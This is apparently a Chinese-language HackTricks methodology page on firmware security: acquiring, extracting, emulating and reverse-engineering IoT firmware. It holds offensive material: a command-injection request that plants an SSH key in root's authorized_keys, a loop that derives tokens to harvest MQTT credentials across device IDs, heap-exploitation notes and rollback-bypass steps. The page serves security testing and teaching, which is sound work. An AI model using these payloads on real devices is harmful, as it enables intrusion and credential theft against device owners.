# 固件分析

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **简介**

### 相关资源

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

固件是设备正常运行所必需的软件，负责管理并促进硬件组件与用户交互软件之间的通信。固件存储在永久性存储器中，确保设备从通电时起即可访问关键指令，从而启动操作系统。检查并可能修改固件，是发现安全漏洞的重要步骤。<sup>[[2]](#references)[[3]](#references)</sup>

## **收集信息**

**收集信息**是了解设备构成及其所用技术的重要初始步骤。此过程涉及收集以下数据：

- CPU 架构及其运行的操作系统
- Bootloader 详细信息
- 硬件布局和数据手册
- 代码库指标和源代码位置
- 外部库及其许可证类型
- 更新历史和法规认证
- 架构图和流程图
- 安全评估和已发现的漏洞

为此，**开源情报（OSINT）**工具非常有用；同时，也可以通过人工和自动化审查流程分析任何可用的开源软件组件。[Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 等工具提供免费的静态分析，可用于查找潜在问题。

## **获取固件**

可以通过多种方式获取固件，各种方式的复杂程度不尽相同：

- 从源头直接获取（开发者、制造商）
- 按照提供的说明自行构建
- 从官方支持网站下载
- 使用 **Google dork** 查询查找托管的固件文件
- 直接访问 **云存储**，可使用 [S3Scanner](https://github.com/sa7mon/S3Scanner) 等工具
- 使用中间人技术拦截 **更新**
- 通过 **UART**、**JTAG** 或 **PICit** 等连接从设备中 **提取**
- 监听设备通信中的更新请求
- 查找并使用 **硬编码的更新端点**
- 从 Bootloader 或网络中 **转储**
- 如果其他方法都无效，则使用适当的硬件工具 **拆下并读取**存储芯片

### 仅有 UART 日志：通过 flash 中的 U-Boot env 强制启动 root shell

如果 UART RX 被忽略（仅有日志），仍然可以通过离线**编辑 U-Boot 环境变量数据块**来强制启动 init shell：<sup>[[6]](#references)</sup>

1. 使用 SOIC-8 夹子和编程器（3.3V）转储 SPI flash：
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. 找到 U-Boot env 分区，编辑 `bootargs`，加入 `init=/bin/sh`，并为该 blob **重新计算 U-Boot env CRC32**。
3. 只重新刷写 env 分区并重启；UART 上应该会出现 shell。

这对嵌入式设备很有用：这类设备的 bootloader shell 已禁用，但可以通过外部 flash 访问写入 env 分区。

## 分析固件

现在你**已经拿到固件**，需要提取其中的信息，以了解如何处理它。你可以使用以下不同工具：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

如果使用这些工具没有找到太多内容，请使用 `binwalk -E <bin>` 检查映像的**熵**；如果熵低，则它不太可能经过加密。如果熵高，则它很可能经过加密（或以某种方式压缩）。

此外，你可以使用这些工具提取**固件内部嵌入的文件**：

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) 检查文件。

### 获取文件系统

使用前面提到的工具（如 `binwalk -ev <bin>`），你应该已经能够**提取文件系统**。\
Binwalk 通常会将其提取到一个**以文件系统类型命名的文件夹**中，通常是以下类型之一：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### 手动提取文件系统

有时，binwalk 的签名中**没有包含文件系统的魔数**。遇到这种情况时，请使用 binwalk **查找文件系统的偏移量，并从二进制文件中 carve 出压缩的文件系统**，然后根据其类型，按照以下步骤**手动提取**文件系统。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

运行以下 **dd 命令**对 Squashfs 文件系统进行 carving。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

或者也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（如上例所用）

`$ unsquashfs dir.squashfs`

之后，文件将位于 "`squashfs-root`" 目录中。

- CPIO 归档文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于使用 NAND flash 的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 分析 Firmware

获取 firmware 后，必须对其进行剖析，以了解其结构和潜在漏洞。此过程需要使用各种工具来分析并从 firmware 镜像中提取有价值的数据。

### 初始分析工具

以下列出了一组用于初步检查二进制文件（以下简称 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据，以及了解分区和文件系统的详细信息：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

要评估镜像的加密状态，可以使用 `binwalk -E <bin>` 检查其**熵**。熵较低表明可能未加密，而熵较高则可能表示存在加密或压缩。

要提取**嵌入文件**，建议使用 **file-data-carving-recovery-tools** 文档等工具和资源，以及用于检查文件的 **binvis.io**。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，提取结果通常位于以文件系统类型命名的目录中（例如 squashfs、ubifs）。但是，如果 **binwalk** 因缺少 magic bytes 而无法识别文件系统类型，就需要手动提取。这需要先用 `binwalk` 定位文件系统的偏移量，然后使用 `dd` 命令提取文件系统：

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

之后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），使用不同的命令手动提取其内容。

### 文件系统分析

提取文件系统后，便开始搜索安全漏洞。重点检查不安全的网络守护进程、硬编码凭据、API 端点、更新服务器功能、未编译代码、启动脚本，以及用于离线分析的编译二进制文件。

需要检查的**关键位置**和**项目**包括：

- **etc/shadow** 和 **etc/passwd** 中的用户凭据
- **etc/ssl** 中的 SSL 证书和密钥
- 可能存在漏洞的配置文件和脚本文件
- 用于进一步分析的嵌入式二进制文件
- 常见 IoT 设备 Web 服务器和二进制文件

以下工具有助于在文件系统中发现敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker)：用于搜索敏感信息
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)：用于全面的固件分析
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 和 [**EMBA**](https://github.com/e-m-b-a/emba)：用于静态和动态分析

### 编译二进制文件的安全检查

必须检查文件系统中发现的源代码和编译二进制文件是否存在漏洞。**checksec.sh** 等工具可用于 Unix 二进制文件，**PESecurity** 则用于 Windows 二进制文件；它们有助于识别可能被利用的未受保护二进制文件。

## 通过派生的 URL token 获取云配置和 MQTT 凭据

许多 IoT hub 会从如下形式的云端点获取各设备的配置：<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

在固件分析期间，你可能会发现 `<token>` 是使用硬编码密钥从设备 ID 本地派生的，例如：

- token = MD5( deviceId || STATIC_KEY )，并以大写十六进制表示

这种设计意味着，任何获知 deviceId 和 STATIC_KEY 的人都能重建 URL 并获取云配置，其中往往会暴露明文 MQTT 凭据和 topic 前缀。

实用流程：

1) 从 UART 启动日志中提取 deviceId

- 连接一个 3.3V UART 适配器（TX/RX/GND）并捕获日志：

```bash
picocom -b 115200 /dev/ttyUSB0
```

- 查找打印 cloud config URL 模式和 broker 地址的行，例如：

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) 从固件中恢复 STATIC_KEY 和 token 算法

- 将二进制文件加载到 Ghidra/radare2，并搜索配置路径（"/pf/"）或 MD5 用法。
- 确认算法（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中派生 token，并将摘要转换为大写：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) 收集 cloud 配置和 MQTT 凭据

- 组合 URL 并使用 curl 获取 JSON；用 jq 提取密钥：

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 滥用明文 MQTT 和薄弱的 topic ACL（如果存在）

- 使用恢复的凭据订阅维护主题，查找敏感事件：

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 枚举可预测的设备 ID（大规模操作时需获得授权）

- 许多生态系统会将厂商 OUI/产品/类型字节与顺序递增的后缀组合使用。
- 你可以遍历候选 ID，以编程方式派生 token 并获取配置：

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- 尝试大规模枚举前，务必获得明确授权。
- 在可行时，优先使用仿真或静态分析来提取机密，避免修改目标硬件。


仿真 firmware 的过程可以对设备运行情况或单个程序进行**动态分析**。这种方法可能会遇到硬件或架构依赖方面的挑战，但将根文件系统或特定二进制文件转移到架构和字节序匹配的设备（例如 Raspberry Pi）或预构建的虚拟机上，可以便于进一步测试。

### 仿真单个二进制文件

检查单个程序时，确定程序的字节序和 CPU 架构至关重要。

#### MIPS 架构示例

要仿真 MIPS 架构的二进制文件，可以使用以下命令：

```bash
file ./squashfs-root/bin/busybox
```

并安装必要的仿真工具：

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

对于 MIPS（大端序），使用 `qemu-mips`；对于小端序二进制文件，则使用 `qemu-mipsel`。

#### ARM 架构仿真

对于 ARM 二进制文件，流程类似，使用 `qemu-arm` emulator 进行仿真。

### 完整系统仿真

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具可用于完整固件仿真，实现流程自动化并辅助动态分析。

## 实践中的动态分析

在此阶段，使用真实或仿真的设备环境进行分析。必须确保能够通过 shell 访问 OS 和文件系统。仿真可能无法完美模拟硬件交互，因此有时需要重启仿真。分析时应重新检查文件系统，利用暴露的网页和网络服务，并探索 bootloader 漏洞。固件完整性测试对于识别潜在的 backdoor 漏洞至关重要。

## 运行时分析技术

运行时分析涉及在进程或二进制文件的运行环境中与其交互，并使用 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，通过 fuzzing 和其他技术识别漏洞。

对于没有完整调试器的嵌入式目标，**将静态链接的 `gdbserver` 复制**到设备上，然后远程连接：<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / 无线协处理器消息映射

在 IoT 集线器上，RF 协议栈通常由 **radio MCU** 和 Linux 用户态进程分担。一个实用的工作流程是梳理消息路径：<sup>[[8]](#references)</sup>

1. 空中的 **RF 帧**
2. radio MCU 上的 **控制器端解析器**
3. 转发到 Linux 的 **串行/UART 文本或 TLV 协议**（例如 `/dev/tty*`）
4. 主守护进程中的 **应用分发器**
5. **特定协议的处理程序 / 状态机**

这种架构会产生两个逆向分析目标，而不是一个。如果控制器将二进制无线电帧转换为 `Group,Command,arg1,arg2,...` 这样的文本协议，就要还原：

- **消息组**和分发表
- 哪些消息可能来自**网络**，哪些可能来自控制器本身
- 精确的**厂商专用判别字段**（例如 Zigbee 的 `manufacturer_code` 和自定义 `cluster_command`）
- 哪些处理程序只能在**入网配置**、发现或固件/型号下载阶段触达

对于 Zigbee，具体来说，要捕获配对流量，并检查目标设备是否仍依赖默认的 **Link Key** `ZigBeeAlliance09`。如果是，嗅探入网配置流量可能会暴露 **Network Key**。Zigbee 3.0 install codes 可以降低这种风险，因此要记录受测设备是否确实强制使用它们。

### 厂商专用协议处理程序与 FSM 门控可达性

厂商专用的 Zigbee/ZCL 命令通常比标准集群更值得作为目标，因为它们会进入**自定义解析代码**和内部 **FSM**，而这些代码的验证往往未经充分实战检验。<sup>[[8]](#references)</sup>

实用工作流程：

- 逆向分析命令分发器，直到找到**仅供厂商使用的处理程序**。
- 还原 **FSM 状态**、**事件**、**检查**、**动作**和**下一状态**表。
- 找出会自动前进的**过渡状态**，以及最终会重置或释放攻击者可控状态的重试/错误分支。
- 确认需要哪些合法协议交互才能让守护进程进入易受攻击状态，而不要假设有缺陷的处理程序始终可达。

对于对时序敏感的协议，使用 Python 框架重放数据包可能太慢。更可靠的方法是在真实硬件上（例如 **nRF52840**）模拟合法设备，并使用厂商级协议栈，以便呈现正确的 **endpoints**、**attributes** 和入网配置时序。

### 嵌入式守护进程中的分片下载漏洞类别

一种反复出现的固件漏洞类别存在于**分片式 blob/型号/配置下载**中：<sup>[[8]](#references)</sup>

1. **第一个分片**（`offset == 0`）会存储 `ctx->total_size` 并分配 `malloc(total_size)`。
2. 后续分片只会验证攻击者可控的**数据包局部**字段，例如 `packet_total_size >= offset + chunk_len`。
3. 复制操作使用 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`，却不检查是否超出**最初分配的大小**。

攻击者可以：

- 发送第一个有效分片，并声明一个**较小**的总大小，从而强制进行小型堆分配。
- 随后发送一个具有**预期偏移量**、但 `chunk_len` 更大的分片。
- 伪造数据包局部大小，使其通过新一轮检查，同时仍溢出最初分配的缓冲区。

如果易受攻击的路径受入网配置逻辑保护，那么在发送格式错误的分片之前，利用过程必须包含足够的**设备模拟**，以驱动目标进入预期的型号下载或 blob 下载状态。

### 由协议驱动的 `free()` 触发机制

在嵌入式守护进程中，触发堆元数据利用最简单的方式往往不是“等待清理”，而是**利用协议自身的错误处理机制**：<sup>[[8]](#references)</sup>

- 发送格式错误的后续分片，让 FSM 进入**重试**或**错误**状态。
- 超过重试阈值，使守护进程**重置上下文**并释放已损坏的缓冲区。
- 利用这个可预测的 `free()`，在进程因其他原因崩溃之前触发分配器侧原语。

这对于嵌入式 Linux 上使用 **musl/uClibc/dlmalloc-like** 分配器的目标尤其有用，因为损坏 chunk 元数据可以将 unlink/unbin 逻辑转化为写入原语。一个稳定的模式是损坏**大小字段**，将分配器遍历引导到溢出缓冲区中布置的**伪造 chunk**，而不是立即破坏真实 bin 指针并导致进程崩溃。

## 二进制利用与概念验证

为已发现的漏洞开发 PoC，需要深入了解目标架构，并使用较低级别的语言进行编程。嵌入式系统中很少启用二进制运行时保护，但如果存在，可能就需要使用 Return Oriented Programming (ROP) 等技术。

### uClibc fastbin 利用要点（嵌入式 Linux）

- **Fastbins + consolidation：**uClibc 使用与 glibc 类似的 fastbins。之后进行的大型分配可能会触发 `__malloc_consolidate()`，因此任何伪造的 chunk 都必须通过检查（合理的大小、`fd = 0`，以及周围的 chunk 被视为“正在使用”）。<sup>[[6]](#references)</sup>
- **ASLR 下的非 PIE 二进制文件：**如果启用了 ASLR，但主二进制文件是**非 PIE**，则二进制文件内部的 `.data/.bss` 地址是稳定的。可以将目标设为一个本身就类似有效堆 chunk 头部的区域，让 fastbin 分配落到**函数指针表**上。
- **用于停止解析器的 NUL：**解析 JSON 时，负载中的 `\x00` 可以停止解析，同时保留后续攻击者可控的字节，用于栈迁移/ROP 链。
- **通过 `/proc/self/mem` 执行 shellcode：**一个调用 `open("/proc/self/mem")`、`lseek()` 和 `write()` 的 ROP 链，可以在已知映射中写入可执行 shellcode 并跳转到该位置。

## 用于固件分析的预配置操作系统

[AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 等操作系统提供了预配置环境，用于固件安全测试，并配备了所需工具。

## 用于固件分析的预配置 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos)：AttifyOS 是一个旨在帮助你对物联网 (IoT) 设备进行安全评估和渗透测试的发行版。它提供预配置环境并预装所有必要工具，为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS)：基于 Ubuntu 18.04 的嵌入式安全测试操作系统，预装了固件安全测试工具。

## 固件降级攻击与不安全的更新机制

即使厂商为固件映像实现了加密签名检查，**版本回滚（降级）保护也经常被忽略**。如果 boot 或 recovery loader 只使用内置公钥验证签名，却不比较待刷入映像的*版本*（或单调计数器），攻击者就可以合法安装**仍带有有效签名的较旧易受攻击固件**，从而重新引入已修补的漏洞。<sup>[[4]](#references)</sup>

典型攻击流程：

1. **获取较旧的签名映像**
   * 从厂商公开的下载门户、CDN 或支持网站获取。
   * 从配套的移动/桌面应用中提取（例如 Android APK 的 `assets/firmware/` 目录）。
   * 从 VirusTotal、Internet archives、论坛等第三方存储库获取。
2. **将映像上传到设备或提供给设备**，利用任何暴露的更新通道：
   * Web UI、移动应用 API、USB、TFTP、MQTT 等。
   * 许多消费级 IoT 设备暴露了*未经身份验证*的 HTTP(S) 端点，这些端点会接受 Base64 编码的固件 blob，在服务器端解码并触发恢复/升级。
3. 降级后，利用较新版本中已修补的漏洞（例如后来添加的命令注入过滤器）。
4. 获得持久化后，可以选择重新刷入最新映像或禁用更新，以避免被发现。

### 示例：降级后的命令注入

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

在存在漏洞的（降级后的）固件中，`md5` 参数未经清理便直接拼接到 shell 命令中，从而允许注入任意命令（此处用于启用基于 SSH 密钥的 root 访问）。后续固件版本加入了基本的字符过滤，但由于缺少降级保护，这项修复形同虚设。<sup>[[4]](#references)</sup>

### 从移动应用中提取固件

许多厂商会将完整固件映像捆绑在配套移动应用中，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些软件包通常以未加密的形式存储在 APK/APEX 中的 `assets/fw/` 或 `res/raw/` 等路径下。使用 `apktool`、`ghidra` 甚至普通的 `unzip` 等工具，无需接触实体硬件即可提取经过签名的映像。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot 设计中仅在更新程序中实现的 anti-rollback 绕过

有些厂商确实实现了 anti-downgrade **ratchet**，但只在*更新程序*逻辑中实现（例如通过 CAN 运行的 UDS routine、recovery 命令或用户空间 OTA agent）。如果 **bootloader** 后续只检查镜像签名/CRC，并信任分区表或 slot 元数据，仍然可以绕过 rollback protection。<sup>[[7]](#references)</sup>

典型的弱设计：

- Firmware 元数据同时包含版本描述符和 **security ratchet** / 单调计数器。
- 更新程序将镜像 ratchet 与持久化存储中的值比较，并拒绝较旧的已签名镜像。
- **bootloader** 不解析该 ratchet，只在启动所选 slot 前验证 header、CRC 和签名。
- Slot 激活状态单独存储在分区表或每个 slot 的 generation counter 中，且**未通过加密方式绑定**到已验证的确切 firmware digest。

这会在双 slot 系统中形成一个**验证一个镜像、启动另一个镜像**的原语。如果攻击者能让更新程序使用当前的已签名镜像将 slot B 标记为下次启动目标，并能在重启前覆盖 slot B，bootloader 仍可能启动降级镜像，因为它只信任已提交的 slot 元数据。

常见的滥用方式：

1. 将**当前的已签名** firmware 上传到被动 slot，并运行常规验证/切换流程，使布局将该 slot 标记为下一个活动 slot。
2. **暂不重启**。在同一会话中重新进入 slot 准备/擦除流程。
3. 利用过期的 boot-state 或 slot 选择逻辑，让更新程序擦除**刚刚被提升的同一个物理 slot**。
4. 将**较旧但仍已签名**的 firmware 写入该 slot。
5. 跳过执行 ratchet 检查的验证流程，直接重启。
6. Bootloader 选择被提升的 slot，只验证签名/完整性，然后启动旧镜像。

逆向 A/B 更新实现时需要留意：

- Slot 选择依据的是**启动时标志**，而成功切换后这些标志没有刷新。
- 类似 `prepare_passive_slot()` 的 routine 根据过期状态而不是**当前已提交布局**擦除 slot。
- 类似 `part_write_layout()` 的函数只递增**generation counter** / 活动标志，却不保存已验证镜像的 hash。
- Ratchet 检查只在用户空间或更新程序代码中实现，**未在 ROM / bootloader / secure boot 阶段实现**。
- 擦除或 recovery routine 删除并重写 slot 内容后，仍将该 slot 保持为可启动状态。

### 更新逻辑评估清单

* *update endpoint* 的传输/认证是否得到了充分保护（TLS + authentication）？
* 设备是否在刷写前比较**版本号**或**单调 anti-rollback 计数器**？
* 镜像是否在 secure boot chain 内进行验证（例如由 ROM 代码检查签名）？
* **bootloader 是否执行与更新程序相同的 ratchet**，而非只检查签名/CRC？
* Slot 激活元数据是否**绑定到已验证的 firmware digest/version**，还是 slot 提升后仍可被修改？
* Slot 切换成功后，设备是否会被强制重启？还是同一会话中仍可调用后续更新/擦除流程？
* Userland 代码是否执行其他合理性检查（例如允许的分区映射、型号）？
* *partial* 或 *backup* 更新流程是否复用相同的验证逻辑？

> 💡  如果缺少上述任意一项，该平台很可能容易遭受 rollback attacks。

## 用于练习的易受攻击 firmware

要练习发现 firmware 中的漏洞，可以从以下易受攻击的 firmware 项目开始。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 从嵌入式 KMS/Vault 状态中恢复 firmware 解密密钥

当更新镜像混合了少量明文元数据和大型高熵数据块时，先进行容器初步分析，再尝试暴力破解：<sup>[[1]](#references)</sup>

- 使用 `hexdump`、`xxd`、`strings -tx`、`base64 -d` 和 `binwalk -E` 导出 header、偏移量和行边界。
- `Salted__` 通常表示 OpenSSL `enc` 格式：接下来的 8 个字节是 salt，其余字节是 ciphertext。
- 如果某个 Base64 字段解码后恰好为 `256` 字节，这强烈暗示它是 RSA-2048 ciphertext，用于封装随机 firmware 密码/会话密钥。
- 同一文件中的 detached PGP 数据通常只用于保护真实性；不要假设它是用于保密的机制。

如果静态密钥搜索（`grep`、`strings`、PEM/PGP 搜索）没有结果，应逆向**实际解密流程**，而不是只搜索私钥：

- 反编译更新程序/管理二进制文件，追踪哪个组件读取加密数据块、哪个 helper/API 对其解封装，以及它请求的逻辑密钥名称。
- 在提取出的根文件系统中搜索 KMS 状态（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`），以及 unit 文件和 init 脚本。
- 将明文 `vault operator unseal ...`、recovery keys、bootstrap tokens 或本地 KMS auto-unseal 脚本视为等同于私钥材料。

如果设备附带原始 Vault 二进制文件和存储后端，重放该环境通常比重新实现 Vault 内部逻辑更容易：

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

在克隆的 KMS 上以 root 身份操作：

- 仅在隔离的克隆环境中将 transit keys 设为可导出：`vault write transit/keys/<name>/config exportable=true`
- 导出 unwrap key：`vault read transit/export/encryption-key/<name>`
- 使用 KMS 实际采用的精确填充/哈希组合尝试恢复的 RSA key。PKCS#1 v1.5 解密失败以及默认 OAEP 解密失败，**都不能**证明该 key 有误；许多基于 Vault 的流程使用 SHA-256 的 OAEP，而常见库默认使用 SHA-1。
- 如果 payload 以 `Salted__` 开头，请准确复现厂商的 OpenSSL KDF（`EVP_BytesToKey`，旧款设备通常使用 MD5），然后再尝试 AES-CBC 解密。

这样，“加密固件”就变成了一个更通用的问题：**恢复设备端的运行密钥，然后离线复现精确的 unwrap + KDF 参数**。

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [用 Claude 破解固件：高级技能，初级自主性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [固件安全测试方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [实用 IoT 黑客技术：攻击物联网的权威指南](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [利用废弃硬件中的零日漏洞 – Trail of Bits 博客](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [一个 20 美元的智能设备如何让我访问你的家](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [现在你看见了 mi：现在你被 Pwn 了](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 从充电端口连接器入手 Exploiting Tesla Wall Connector - 第 2 部分：绕过防降级机制](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [让它闪烁：通过无线方式 Exploiting Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
